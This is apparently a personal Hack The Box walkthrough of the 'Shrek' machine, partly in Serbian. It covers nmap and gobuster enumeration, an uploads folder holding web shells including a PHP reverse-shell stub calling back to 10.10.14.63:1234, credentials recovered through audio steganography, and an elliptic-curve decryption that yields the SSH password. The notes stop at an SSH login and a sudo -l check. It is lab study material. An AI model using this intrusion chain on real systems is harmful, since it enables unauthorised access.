kangus7@kali:~$ sudo nmap -sC -sV -A 10.10.10.47
[sudo] password for kangus7: 
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-20 20:19 CEST
Nmap scan report for 10.10.10.47
Host is up (0.036s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3 									<- possible vulenrability
22/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey: 
|   2048 2d:a7:95:95:5d:dd:75:ca:bc:de:36:2c:33:f6:47:ef (RSA)
|   256 b5:1f:0b:9f:83:b3:6c:3b:6b:8b:71:f4:ee:56:a8:83 (ECDSA)
|_  256 1f:13:b7:36:8d:cd:46:6c:29:6d:be:e4:ab:9c:24:5b (ED25519)
80/tcp open  http    Apache httpd 2.4.27 ((Unix))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.27 (Unix)
|_http-title: Home
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.70%E=4%D=6/20%OT=21%CT=1%CU=34791%PV=Y%DS=2%DC=T%G=Y%TM=5D0BCE5
OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=103%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
OS:1NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
OS:(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Unix

TRACEROUTE (using port 8888/tcp)
HOP RTT      ADDRESS
1   35.00 ms 10.10.14.1
2   35.10 ms 10.10.10.47

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.52 seconds



SearchSploit – The Manual
https://www.exploit-db.com/searchsploit

###nista za 3.0.3 verziju
kangus7@kali:~$ searchsploit vsftpd
---------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                                            |  Path
                                                                                                                                                          | (/usr/share/exploitdb/)
---------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
vsftpd 2.0.5 - 'CWD' (Authenticated) Remote Memory Consumption                                                                                            | exploits/linux/dos/5814.pl
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (1)                                                                                            | exploits/windows/dos/31818.sh
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (2)                                                                                            | exploits/windows/dos/31819.pl
vsftpd 2.3.2 - Denial of Service                                                                                                                          | exploits/linux/dos/16270.c
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                    | exploits/unix/remote/17491.rb
---------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result



###BURP Suite

Using Burp Proxy 			<- 127.0.0.1:8080 		<- ProxySwitcherOmega
https://portswigger.net/burp/documentation/desktop/tools/proxy/using#getting-set-up

Using the Target tool
https://portswigger.net/burp/documentation/desktop/tools/target/using

BURP Suite -> Target -> Add scope (Filter:show only in-scope items)
					 -> Spider this host

naisao sam na http://10.10.10.47/upload.html 			<- nudi upload fajlova
														   ne znam gde je upload-ovan fajl zavrsio		


###GoBuster
Directory/file & DNS busting tool written in Go
https://github.com/OJ/gobuster

#instalacija
kangus7@kali:~$ sudo apt install -y gobuster


###Word liste i rockyou.txt
sjelicic@Laki:~$ tree /usr/share/wordlists/
/usr/share/wordlists/
├── dirb -> /usr/share/dirb/wordlists
├── dirbuster -> /usr/share/dirbuster/wordlists
├── dnsmap.txt -> /usr/share/dnsmap/wordlist_TLAs.txt
├── fasttrack.txt -> /usr/share/set/src/fasttrack/wordlist.txt
├── fern-wifi -> /usr/share/fern-wifi-cracker/extras/wordlists
├── metasploit -> /usr/share/metasploit-framework/data/wordlists
├── nmap.lst -> /usr/share/nmap/nselib/data/passwords.lst
├── rockyou.txt.gz
├── sqlmap.txt -> /usr/share/sqlmap/txt/wordlist.txt
└── wfuzz -> /usr/share/wfuzz/wordlist

rockyou.txt 				<- 123 MB passworda
https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt


kangus7@kali:~$ gobuster -u http://10.10.10.47 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 40

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.47/
[+] Threads      : 40
[+] Wordlist     : /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2019/06/20 21:08:29 Starting gobuster
=====================================================
/images (Status: 301)
/uploads (Status: 301) 										<- mesto gde je zavrsio upload-ovan
/memes (Status: 301)                                           fajl
/shrek (Status: 301)                                           3xx: HTTP Redirection Codes
=====================================================		   301 Moved Permanently
2019/06/20 21:14:03 Finished
=====================================================


http://10.10.10.47/uploads/
Index of /uploads
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	-	 
[   ]	cow.php5	2017-08-12 03:26	71	 
[   ]	legit.asp	2017-08-12 03:26	38K	 
[   ]	lolol.asp	2017-08-12 03:26	38K	 
[   ]	secret_ultimate.php	2017-08-15 15:36	3.6K	    <- jedini fajl koji ima nekog smisla 
[   ]	shell.elf	2017-08-12 03:26	152	 
[   ]	shell.php	2017-08-12 03:26	71	 
[   ]	siren.aspx	2017-08-12 03:26	2.7K	 
[   ]	trll.exe	2017-08-12 03:26	7.0K	 


#determine file type 
kangus7@kali:~$ file ~/Downloads/cow.php5 
/home/kangus7/Downloads/cow.php5: data




http://10.10.10.47/uploads/secret_ultimate.php

<?php

set_time_limit (0);
$VERSION = "1.0";
$end_path = site/secret_area_51 // friggin' finally found the secret dir!!
$ip = '10.10.14.63';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
*
*
*
etc.



http://10.10.10.47/secret_area_51/

Index of /secret_area_51
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	-	 
[SND]	Smash Mouth - All St..>	2017-08-15 15:23	3.3M	 


###Steganography, Sonic Visualiser
sudo apt install -y sonic-visualiser

sonic-visualiser/kali-rolling,now 3.2.1-1 amd64 [installed]
  viewing and analysing the contents of music audio files

Sonic Visualiser -> Pane -> Add Spectrogram (pri samom kraju mp3 fajla, zvuci kao white noise)
###poruka
FTP:
donkey:d0nk3y1337!



###pristupam ftp serveru
kangus7@kali:~$ sudo apt install -y ftp

kangus7@kali:~$ ftp 10.10.10.47
Connected to 10.10.10.47.
220 (vsFTPd 3.0.3)
Name (10.10.10.47:kangus7): donkey
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0           15360 Jun 17 00:01 01b7cf28380f45b08d0a713b658bd210.txt
-rw-r--r--    1 0        0            5120 Jun 17 00:01 1fa860c69ec74f33bf431c4ba8561b6f.txt
-rw-r--r--    1 0        0            6144 Jun 17 00:01 2078c089ae2a481ab73d5e2ffb06f924.txt
-rw-r--r--    1 0        0           11264 Jun 17 00:01 25c39046d9864f85a4b8cc523f4e64fa.txt
-rw-r--r--    1 0        0            9216 Jun 17 00:01 2aa8bfe51f234e24bde7c6a15b3503b4.txt
-rw-r--r--    1 0        0            8192 Jun 17 00:01 3368acf560ac42f494bd35205e15860f.txt
-rw-r--r--    1 0        0            6144 Jun 17 00:01 34da9520886f41148d25048c29fa8ce7.txt
-rw-r--r--    1 0        0           10240 Jun 17 00:01 37f2c0de2fc74d4c87b078014029baab.txt
-rw-r--r--    1 0        0            9216 Jun 17 00:01 4242ee6290ab44c9aa17ef4256d5820b.txt
-rw-r--r--    1 0        0            9216 Jun 17 00:01 484802c1df5d4f0d9c86a93f1e656dda.txt
-rw-r--r--    1 0        0            5120 Jun 17 00:01 4a94f4c336944d86b47b6a7a6a8b92ef.txt
-rw-r--r--    1 0        0            9216 Jun 17 00:01 6eaddfc0383d4ef5ae5a5fa2f85ad343.txt
-rw-r--r--    1 0        0            3072 Jun 17 00:01 70801e4d565045c6860d63c0e226c00c.txt
-rw-r--r--    1 0        0            9216 Jun 17 00:01 792ed6e83c2b4cd4938879405d4d444b.txt
-rw-r--r--    1 0        0            5120 Jun 17 00:01 79a4c7db86f6465299fe09397ecda329.txt
-rw-r--r--    1 0        0            7168 Jun 17 00:01 8991747953ca4863b641ce20171a5f10.txt
-rw-r--r--    1 0        0           15360 Jun 17 00:01 8fa6751b681f48159539fa50ac301ed1.txt
-rw-r--r--    1 0        0            4096 Jun 17 00:01 993b8846e8634be2a00178fb81a10192.txt
-rw-r--r--    1 0        0           13312 Jun 17 00:01 a19377db540640f59b1021353c0e77e6.txt
-rw-r--r--    1 0        0           10240 Jun 17 00:01 a19f8ae0ccd845a58672fefd33ced690.txt
-rw-r--r--    1 0        0           14366 Jun 17 00:01 bcba2171e7dc494e8607f90d32f07d25.txt
-rw-r--r--    1 0        0            4096 Jun 17 00:01 c3bf801775154aafa4eacaaaced704ee.txt
-rw-r--r--    1 0        0            8192 Jun 17 00:01 c5224d215074449380164fc78b7bafd9.txt
-rw-r--r--    1 0        0           11264 Jun 17 00:01 c5324cf3f97a4a3caf88e0bd64b3d8cf.txt
-rw-r--r--    1 0        0            7168 Jun 17 00:01 d0589bf8b965470d941f05d3b56d1b82.txt
-rw-r--r--    1 0        0            6144 Jun 17 00:01 d1ddd6e200ab453b86c7a5db4742884d.txt
-rw-r--r--    1 0        0            7168 Jun 17 00:01 f1b20c228acc400a869cdabd302b8a86.txt
-rw-r--r--    1 0        0           12288 Jun 17 00:01 f6b2c422e2f34477830d4e3716391bb0.txt
-rw-r--r--    1 0        0           10240 Jun 17 00:01 f821e15afad04d358a4146602885d2d3.txt
-rw-r--r--    1 0        0            5550 Jun 17 00:01 fdace91754ba4c60a5ad3777e462833e.txt
-rw-r--r--    1 0        0           11264 Jun 17 00:01 fdc411cde8504881a99a715a5714298a.txt
-rw-r--r--    1 0        0            1766 Aug 16  2017 key
226 Directory send OK.


kangus7@kali:~/pCloudDrive/OSCP/HTB/Shrek$ ftp 10.10.10.47
Connected to 10.10.10.47.
220 (vsFTPd 3.0.3)
Name (10.10.10.47:kangus7): donkey
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> prompt 								<- ne moram da yes-ujem svaki fajl
Interactive mode off.
ftp> mget *


kangus7@kali:~/pCloudDrive/OSCP/HTB/Shrek$ cat key 						<- encrypted RSA private key
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,94DC7309349E17F8ED6776ED69D6265A

rx7VJS6fzctpfTQ16y9M2CYG701eIh3nDQND+MSFAMSD8JiElqiIH7yA6TpXKPPx
A9gcxf1qlezc3XIhQpsLN9tLJpOxWYMniUo06/7k+2vWO6AzX27hVPRk1vk9OTWG
gRe856uaS8WfQ3XxehHNk1bu710HzBSwZn/XNbHsNo74Bpol8MTm2BTjvnuxnFY8
tvw53nbXMQffBmrwBTvc5aaCk/C0LfvemSxLAgAwMACNpbPmdw9NkUxRDbL/93Q1
ZYMlFxiXhLgFWQFdW/u2WURmOcIuAHd1V8gWIvY10IpH7o4nXaCI4D8PUmnIDt2N
k6Q3Znnfe8BrzFlD1NdG5SfHNdNUn5N9DROk0cZsL+D9e9bQb5CoyL2ioL9fEeRv
4J5w2ZnIHStAez+Za11WGcZsW3jk2eXGPZiD99k5GcazWQ60dv5dUR6J5fkxaibi
unqmN2tDaKReT7aT4Im6pLUscN8t2w8dprgsD/EbMsPr0X/TqOShXXhMUhk/9SAY
2Rvudp97fqYHugIch4lZdDpYS//KRwzO+wQOQARX0tJ0DJ++lY6WNM/BD6+HUk+v
2c3ziM7DL4i7zhA0qnc8796Nxs8D/QTUWjmcNQhcOM4rAYsmyRqyoVe3ciadKWmk
vfwBJYxCwE9I9qUfZS3TsEYdbLE4MjlFB+Zn+fYpyA950hVFDxvu+E8zIcSYA0bJ
GAra2vH/xgmEoptYqeav/sstisJOYPW1Ui3K5C9E0QMH2MRReZoHlToCSNwUOWRo
rY1z3UZMyV5qw3VsuOk+n81P2npyP0RYo6xjAQW/1uN01LPi6y79j/3k9L35N7pH
vJHACTHa1bgCGkYGYm75DRIPYqJKs8g3htPHTbyfAfybeMBFQFxz3SBSWp8T9yjF
+WKUWQ2EmUtgC9n04tLf1/SIldvtOvtwyv2LiIzgvtT6DCMoulprRlb+U0iY1kbQ
lrpUhFtcK1SvC4Z6ebAEoX/jVRWKdbKldr35ECwIiMVNUFhvXwg4JRdmgmeeDga5
66TSTqupISE7q6MuBfesQItkoiairO36enBvYdifN4/kRFBNXo1ZUTzdKVw6/UVo
n9tG9Fnk/z/Ee0iuT3PS0xtu6cBaXzFggm1n73honBjJzIJdtDAJ2AFSMJg6F6TJ
d0BPB0SGfF8rU+s0RjBhr1nE+px9qYKsuPAKkfi/b/EVa5WEacNezUTTKW9v9DjM
ym/zSi9GMDEczlFO2wthN5MXh0XNzUyQxDAcek1uZyaQd66NXQ0AywQG114+XLx8
29sJvTuy6PXJs4ZUCno4/7RQnG9mwHtcV2f3ETASTjtsxBVotzfnpB22jgRND1fi
Ovqy0xbhRUrBhl8MjuE4Ha/ttoKvbDxC6PlVPMfjp3y2sTIDRp7HpAJfKoVMdJ5Y
9FoWkWhrGkshGMIxyF3YE6cyhy8OOvmoEcNjyusCi1VWJpRxWU9Ml+GUH5gsjdAV
yiPvEG4LnM4gGeHhn9CZcrFJSYKIS0s+410YQvpECx09LaLBtq5y0QNkIspuKSPB
UDidMCyboqlc47D6SgNk7WQqut9tFj6PXE3chFFBHGfZ3hF9HnbUWBEiqyvOlAnm
-----END RSA PRIVATE KEY-----


kangus7@kali:~/pCloudDrive/OSCP/HTB/Shrek/ftp$ file *.txt
01b7cf28380f45b08d0a713b658bd210.txt: ASCII text, with very long lines, with no line terminators
1fa860c69ec74f33bf431c4ba8561b6f.txt: ASCII text, with very long lines, with no line terminators
2078c089ae2a481ab73d5e2ffb06f924.txt: ASCII text, with very long lines, with no line terminators
25c39046d9864f85a4b8cc523f4e64fa.txt: ASCII text, with very long lines, with no line terminators
2aa8bfe51f234e24bde7c6a15b3503b4.txt: ASCII text, with very long lines, with no line terminators
3368acf560ac42f494bd35205e15860f.txt: ASCII text, with very long lines, with no line terminators
34da9520886f41148d25048c29fa8ce7.txt: ASCII text, with very long lines, with no line terminators
37f2c0de2fc74d4c87b078014029baab.txt: ASCII text, with very long lines, with no line terminators
4242ee6290ab44c9aa17ef4256d5820b.txt: ASCII text, with very long lines, with no line terminators
484802c1df5d4f0d9c86a93f1e656dda.txt: ASCII text, with very long lines, with no line terminators
4a94f4c336944d86b47b6a7a6a8b92ef.txt: ASCII text, with very long lines, with no line terminators
6eaddfc0383d4ef5ae5a5fa2f85ad343.txt: ASCII text, with very long lines, with no line terminators
70801e4d565045c6860d63c0e226c00c.txt: ASCII text, with very long lines, with no line terminators
792ed6e83c2b4cd4938879405d4d444b.txt: ASCII text, with very long lines, with no line terminators
79a4c7db86f6465299fe09397ecda329.txt: ASCII text, with very long lines, with no line terminators
8991747953ca4863b641ce20171a5f10.txt: ASCII text, with very long lines, with no line terminators
8fa6751b681f48159539fa50ac301ed1.txt: ASCII text, with very long lines, with no line terminators
993b8846e8634be2a00178fb81a10192.txt: ASCII text, with very long lines, with no line terminators
a19377db540640f59b1021353c0e77e6.txt: ASCII text, with very long lines, with no line terminators
a19f8ae0ccd845a58672fefd33ced690.txt: ASCII text, with very long lines, with no line terminators
bcba2171e7dc494e8607f90d32f07d25.txt: ASCII text, with very long lines, with no line terminators
c3bf801775154aafa4eacaaaced704ee.txt: ASCII text, with very long lines, with no line terminators
c5224d215074449380164fc78b7bafd9.txt: ASCII text, with very long lines, with no line terminators
c5324cf3f97a4a3caf88e0bd64b3d8cf.txt: ASCII text, with very long lines, with no line terminators
d0589bf8b965470d941f05d3b56d1b82.txt: ASCII text, with very long lines, with no line terminators
d1ddd6e200ab453b86c7a5db4742884d.txt: ASCII text, with very long lines, with no line terminators
f1b20c228acc400a869cdabd302b8a86.txt: ASCII text, with very long lines, with no line terminators
f6b2c422e2f34477830d4e3716391bb0.txt: ASCII text, with very long lines, with no line terminators
f821e15afad04d358a4146602885d2d3.txt: ASCII text, with very long lines, with no line terminators
fdace91754ba4c60a5ad3777e462833e.txt: ASCII text, with very long lines, with no line terminators
fdc411cde8504881a99a715a5714298a.txt: ASCII text, with very long lines, with no line terminators


http://rumkin.com/tools/cipher/ 			<- nije koristio
https://quipqiup.com/ 						<- pokusao bez uspeha



The Standard Bash For Loop
The for loop iterates over a list of items and performs the given set of commands.

The Bash for loop takes the following form:

for item in [LIST]
do
  [COMMANDS]
done


#lista sve txt fajlove unutar direktorijuma
kangus7@kali:~/pCloudDrive/OSCP/HTB/Shrek/ftp$ for i in 'ls *.txt'; do echo $i; done
ls 01b7cf28380f45b08d0a713b658bd210.txt 1fa860c69ec74f33bf431c4ba8561b6f.txt 2078c089ae2a481ab73d5e2ffb06f924.txt 25c39046d9864f85a4b8cc523f4e64fa.txt 2aa8bfe51f234e24bde7c6a15b3503b4.txt 3368acf560ac42f494bd35205e15860f.txt 34da9520886f41148d25048c29fa8ce7.txt 37f2c0de2fc74d4c87b078014029baab.txt 4242ee6290ab44c9aa17ef4256d5820b.txt 484802c1df5d4f0d9c86a93f1e656dda.txt 4a94f4c336944d86b47b6a7a6a8b92ef.txt 6eaddfc0383d4ef5ae5a5fa2f85ad343.txt 70801e4d565045c6860d63c0e226c00c.txt 792ed6e83c2b4cd4938879405d4d444b.txt 79a4c7db86f6465299fe09397ecda329.txt 8991747953ca4863b641ce20171a5f10.txt 8fa6751b681f48159539fa50ac301ed1.txt 993b8846e8634be2a00178fb81a10192.txt a19377db540640f59b1021353c0e77e6.txt a19f8ae0ccd845a58672fefd33ced690.txt bcba2171e7dc494e8607f90d32f07d25.txt c3bf801775154aafa4eacaaaced704ee.txt c5224d215074449380164fc78b7bafd9.txt c5324cf3f97a4a3caf88e0bd64b3d8cf.txt d0589bf8b965470d941f05d3b56d1b82.txt d1ddd6e200ab453b86c7a5db4742884d.txt f1b20c228acc400a869cdabd302b8a86.txt f6b2c422e2f34477830d4e3716391bb0.txt f821e15afad04d358a4146602885d2d3.txt fdace91754ba4c60a5ad3777e462833e.txt fdc411cde8504881a99a715a5714298a.txt


#razlike je u `ls *.txt`
#The backtick `…` is actually called command substitution. The purpose of command substitution is to #evaluate the command which is placed inside the backtick and provide its result as an argument to #the actual command.
#The command substitution can be done in two ways one is using $(…) and the other is `…`. Both work #same, but the $(…) form is the modern way and has more clarity and readability.

https://unix.stackexchange.com/questions/27428/what-does-backquote-backtick-mean-in-commands


kangus7@kali:~/pCloudDrive/OSCP/HTB/Shrek/ftp$ for i in `ls *.txt`; do echo $i; done
01b7cf28380f45b08d0a713b658bd210.txt
1fa860c69ec74f33bf431c4ba8561b6f.txt
2078c089ae2a481ab73d5e2ffb06f924.txt
25c39046d9864f85a4b8cc523f4e64fa.txt
2aa8bfe51f234e24bde7c6a15b3503b4.txt
3368acf560ac42f494bd35205e15860f.txt
34da9520886f41148d25048c29fa8ce7.txt
37f2c0de2fc74d4c87b078014029baab.txt
4242ee6290ab44c9aa17ef4256d5820b.txt
484802c1df5d4f0d9c86a93f1e656dda.txt
4a94f4c336944d86b47b6a7a6a8b92ef.txt
6eaddfc0383d4ef5ae5a5fa2f85ad343.txt
70801e4d565045c6860d63c0e226c00c.txt
792ed6e83c2b4cd4938879405d4d444b.txt
79a4c7db86f6465299fe09397ecda329.txt
8991747953ca4863b641ce20171a5f10.txt
8fa6751b681f48159539fa50ac301ed1.txt
993b8846e8634be2a00178fb81a10192.txt
a19377db540640f59b1021353c0e77e6.txt
a19f8ae0ccd845a58672fefd33ced690.txt
bcba2171e7dc494e8607f90d32f07d25.txt
c3bf801775154aafa4eacaaaced704ee.txt
c5224d215074449380164fc78b7bafd9.txt
c5324cf3f97a4a3caf88e0bd64b3d8cf.txt
d0589bf8b965470d941f05d3b56d1b82.txt
d1ddd6e200ab453b86c7a5db4742884d.txt
f1b20c228acc400a869cdabd302b8a86.txt
f6b2c422e2f34477830d4e3716391bb0.txt
f821e15afad04d358a4146602885d2d3.txt
fdace91754ba4c60a5ad3777e462833e.txt
fdc411cde8504881a99a715a5714298a.txt

#dekodira base64 fajlove u ime fajla.64, inace bi sve isprintao na ekran
kangus7@kali:~/pCloudDrive/OSCP/HTB/Shrek/ftp$ for i in `ls *.txt`; do base64 -d $i > $i.64; done
base64: invalid input 			<- dva fajla nisu standardni base64 kod
base64: invalid input


kangus7@kali:~/pCloudDrive/OSCP/HTB/Shrek/ftp$ for i in `ls *.txt`; do echo $i; base64 -d $i > $i.64; done
01b7cf28380f45b08d0a713b658bd210.txt
1fa860c69ec74f33bf431c4ba8561b6f.txt
2078c089ae2a481ab73d5e2ffb06f924.txt
25c39046d9864f85a4b8cc523f4e64fa.txt
2aa8bfe51f234e24bde7c6a15b3503b4.txt
3368acf560ac42f494bd35205e15860f.txt
34da9520886f41148d25048c29fa8ce7.txt
37f2c0de2fc74d4c87b078014029baab.txt
4242ee6290ab44c9aa17ef4256d5820b.txt
484802c1df5d4f0d9c86a93f1e656dda.txt
4a94f4c336944d86b47b6a7a6a8b92ef.txt
6eaddfc0383d4ef5ae5a5fa2f85ad343.txt
70801e4d565045c6860d63c0e226c00c.txt
792ed6e83c2b4cd4938879405d4d444b.txt
79a4c7db86f6465299fe09397ecda329.txt
8991747953ca4863b641ce20171a5f10.txt
8fa6751b681f48159539fa50ac301ed1.txt
993b8846e8634be2a00178fb81a10192.txt
a19377db540640f59b1021353c0e77e6.txt
a19f8ae0ccd845a58672fefd33ced690.txt
bcba2171e7dc494e8607f90d32f07d25.txt 				<- fajl
base64: invalid input
c3bf801775154aafa4eacaaaced704ee.txt
c5224d215074449380164fc78b7bafd9.txt
c5324cf3f97a4a3caf88e0bd64b3d8cf.txt
d0589bf8b965470d941f05d3b56d1b82.txt
d1ddd6e200ab453b86c7a5db4742884d.txt
f1b20c228acc400a869cdabd302b8a86.txt
f6b2c422e2f34477830d4e3716391bb0.txt
f821e15afad04d358a4146602885d2d3.txt
fdace91754ba4c60a5ad3777e462833e.txt 				<- fajl
base64: invalid input
fdc411cde8504881a99a715a5714298a.txt



kangus7@kali:~/pCloudDrive/OSCP/HTB/Shrek/ftp$ less bcba2171e7dc494e8607f90d32f07d25.txt 
     UHJpbmNlQ2hhcm1pbmc=     <- unutar fajla ima space-ova, jednako na kraju znaci da se radi o 
     							 base 64 fajlu (base 64 unutar base64 fajla)

kangus7@kali:~/pCloudDrive/OSCP/HTB/Shrek/ftp$ less fdace91754ba4c60a5ad3777e462833e.txt
     J1x4MDFceGQzXHhlMVx4ZjJceDE3VCBceGQwXHg4YVx4ZDZceGUyXHhiZFx4OWVceDllflAoXHhmN1x4ZTlceGE1XHhjMUtUXHg5YUlceGRkXFwhXHg5NXRceGUxXHhkNnBceGFhInUyXHhjMlx4ODVGXHgxZVx4YmNceDAwXHhiOVx4MTdceDk3XHhiOFx4MGJceGM1eVx4ZWM8Sy1ncDlceGEwXHhjYlx4YWNceDlldFx4ODl6XHgxM1x4MTVceDk0RG5ceGViXHg5NVx4MTlbXHg4MFx4ZjFceGE4LFx4ODJHYFx4ZWVceGU4Q1x4YzFceDE1XHhhMX5UXHgwN1x4Y2N7XHhiZFx4ZGFceGYwXHg5ZVx4MWJoXCdRVVx4ZTdceDE2M1x4ZDRGXHhjY1x4YzVceDk5dyc=     


kangus7@kali:~/pCloudDrive/OSCP/HTB/Shrek/ftp$ echo      UHJpbmNlQ2hhcm1pbmc=     | base64 -d
#rezultat
PrinceCharming

kangus7@kali:~/pCloudDrive/OSCP/HTB/Shrek/ftp$ echo     J1x4MDFceGQzXHhlMVx4ZjJceDE3VCBceGQwXHg4YVx4ZDZceGUyXHhiZFx4OWVceDllflAoXHhmN1x4ZTlceGE1XHhjMUtUXHg5YUlceGRkXFwhXHg5NXRceGUxXHhkNnBceGFhInUyXHhjMlx4ODVGXHgxZVx4YmNceDAwXHhiOVx4MTdceDk3XHhiOFx4MGJceGM1eVx4ZWM8Sy1ncDlceGEwXHhjYlx4YWNceDlldFx4ODl6XHgxM1x4MTVceDk0RG5ceGViXHg5NVx4MTlbXHg4MFx4ZjFceGE4LFx4ODJHYFx4ZWVceGU4Q1x4YzFceDE1XHhhMX5UXHgwN1x4Y2N7XHhiZFx4ZGFceGYwXHg5ZVx4MWJoXCdRVVx4ZTdceDE2M1x4ZDRGXHhjY1x4YzVceDk5dyc=     | base64 -d
#rezultat
'\x01\xd3\xe1\xf2\x17T \xd0\x8a\xd6\xe2\xbd\x9e\x9e~P(\xf7\xe9\xa5\xc1KT\x9aI\xdd\\!\x95t\xe1\xd6p\xaa"u2\xc2\x85F\x1e\xbc\x00\xb9\x17\x97\xb8\x0b\xc5y\xec<K-gp9\xa0\xcb\xac\x9et\x89z\x13\x15\x94Dn\xeb\x95\x19[\x80\xf1\xa8,\x82G`\xee\xe8C\xc1\x15\xa1~T\x07\xcc{\xbd\xda\xf0\x9e\x1bh\'QU\xe7\x163\xd4F\xcc\xc5\x99w' 			<- ovo nema pojma sta je
						na kraju se ispostavilo da se radi o eliptic curve kriptografiji
						proba-greska metodom		



###Eliptic Curve Cryptography kroz Python modul
SECCURE compatible Elliptic Curve cryptography in Python
https://github.com/bwesterb/py-seccure

kangus7@kali:~/pCloudDrive/OSCP/HTB/Shrek/ftp$ pip install seccure

kangus7@kali:~/pCloudDrive/OSCP/HTB/Shrek/ftp$ python
Python 2.7.16 (default, Apr  6 2019, 01:42:57) 
[GCC 8.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import seccure
>>> ciphertext = '\x01\xd3\xe1\xf2\x17T \xd0\x8a\xd6\xe2\xbd\x9e\x9e~P(\xf7\xe9\xa5\xc1KT\x9aI\xdd\\!\x95t\xe1\xd6p\xaa"u2\xc2\x85F\x1e\xbc\x00\xb9\x17\x97\xb8\x0b\xc5y\xec<K-gp9\xa0\xcb\xac\x9et\x89z\x13\x15\x94Dn\xeb\x95\x19[\x80\xf1\xa8,\x82G`\xee\xe8C\xc1\x15\xa1~T\x07\xcc{\xbd\xda\xf0\x9e\x1bh\'QU\xe7\x163\xd4F\xcc\xc5\x99w'
>>> ciphertext
'\x01\xd3\xe1\xf2\x17T \xd0\x8a\xd6\xe2\xbd\x9e\x9e~P(\xf7\xe9\xa5\xc1KT\x9aI\xdd\\!\x95t\xe1\xd6p\xaa"u2\xc2\x85F\x1e\xbc\x00\xb9\x17\x97\xb8\x0b\xc5y\xec<K-gp9\xa0\xcb\xac\x9et\x89z\x13\x15\x94Dn\xeb\x95\x19[\x80\xf1\xa8,\x82G`\xee\xe8C\xc1\x15\xa1~T\x07\xcc{\xbd\xda\xf0\x9e\x1bh\'QU\xe7\x163\xd4F\xcc\xc5\x99w'
>>> seccure.decrypt(ciphertext,b'PrinceCharming')
'The password for the ssh file is: shr3k1sb3st! and you have to ssh in as: sec\n'
#22/tcp open  ssh     OpenSSH 7.5 (protocol 2.0) 		<- iz nmap scan-a

#pCloud mi ne dozvoljava da menjam permisije fajlova (iz nekog razloga)
kangus7@kali:~/pCloudDrive/OSCP/HTB/Shrek$ chmod 600 ~/Desktop/key 

kangus7@kali:~/pCloudDrive/OSCP/HTB/Shrek$ ssh -i ~/Desktop/key sec@10.10.10.47
Enter passphrase for key '/home/kangus7/Desktop/key':  							<- shr3k1sb3st!
Last login: Wed Aug 23 10:48:16 2017 from 10.10.22.10
[sec@shrek ~]$ 



Introducing LinEnum – Scripted Local Linux Enumeration & Privilege Escalation Checks 
#nije koriscen na ovoj masini
https://www.rebootuser.com/?p=1758
https://github.com/rebootuser/LinEnum

linuxprivchecker.py -- a Linux Privilege Escalation Check Script
https://github.com/sleventyeleven/linuxprivchecker


man sudo
-l, --list  If no command is specified, list the allowed (and forbidden) commands for the invoking 				user (or the user specified by the -U option) on the current host.  A longer list for‐
            mat is used if this option is specified multiple times and the security policy supports a verbose output format.

            If a command is specified and is permitted by the security policy, the fully-qualified path to the command is displayed along with any command line arguments.  If a command
            is specified but not allowed by the policy, sudo will exit with a status value of 1.


 -u user, --user=user   
 				Run the command as a user other than the default target user (usually root).  The user may be either a user name or a numeric user ID (UID) prefixed with the ‘#’ character
                 (e.g., #0 for UID 0).  When running commands as a UID, many shells require that the ‘#’ be escaped with a backslash (‘\’).  Some security policies may restrict UIDs to those
                 listed in the password database.  The sudoers policy allows UIDs that are not in the password database as long as the targetpw option is not set.  Other security policies
                 may not support this.



###na Shrek masini
[sec@shrek ~]$ sudo -l
